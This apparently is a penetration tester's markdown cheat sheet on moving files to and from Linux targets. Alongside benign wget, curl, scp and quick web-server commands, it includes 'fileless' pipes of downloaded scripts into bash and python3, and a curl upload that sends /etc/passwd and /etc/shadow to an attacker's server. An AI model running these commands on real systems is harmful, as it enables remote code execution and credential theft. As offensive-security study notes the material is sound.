# File Transfers
## @Author : M3tr1c_r00t
### Linux File Transfer Methods
#### Download 
#### Base64 encoding/decoding
```
md5sum FILE
cat FILE|base64 -w 0;echo
```
on target;
```
echo -n 'BASE64_CODE' |base64 -d > FILE_NAME
```
#### Wget
```
wget http://URL -O FILE_NAME
```
#### Curl
```
curl http://URL -o FILE_NAME
```

### Fileless Attack
#### curl
```
curl http://file | bash
```

#### wget 
```
wget -qO http://file | python3
```

#### Download with Bash(/dev/tcp)
![image](https://user-images.githubusercontent.com/99975622/222586124-cb4b01ed-57d0-4016-a599-fb7118e0071c.png)

### SSH Downloads
we are going to use scp(secure copy) for file transfer.
__Enabling ssh server__;
```
sudo systemctl enable ssh
```
 __Starting ssh server__;
 ```
 sudo systemctl start ssh
 ```
__Checking for ssh Listening port__;
```
netstat -lnpt
```
__Downloading files using scp__;
```
scp user@IP:/FILE .
# you will be prompted for a password.
```

### Web Upload
we can use upload server module to work with https.

__Installation...__;
```
python3 -m pip install install --user uploadserver
```

__Creating a Self Signed Certificate__;
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
note that the web-server shouldn't host the certificate. We recommend creating a new directory to host the file.

__Running the server__;
```
python3 -m uploadserver PORT --server-certificate /CERT
```

__uploading from the target machine__;
```
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### Starting a python web server
#### Python3
```
python3 -m http.server 80
```
#### Python2
```
python2 -m SimpleHTTPServer
```

### Starting a php web server
```
php -S 0.0.0.0:8000
```
### Starting a ruby web server
```
ruby -run -ehttpd . -p8000
```

After starting all the web-servers, we can download the file on the target using wget.
```
wget http://IP:PORT/FILE
```

### SCP Upload
```
scp /etc/passwd user@IP:/NEW_FILE
```

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
   
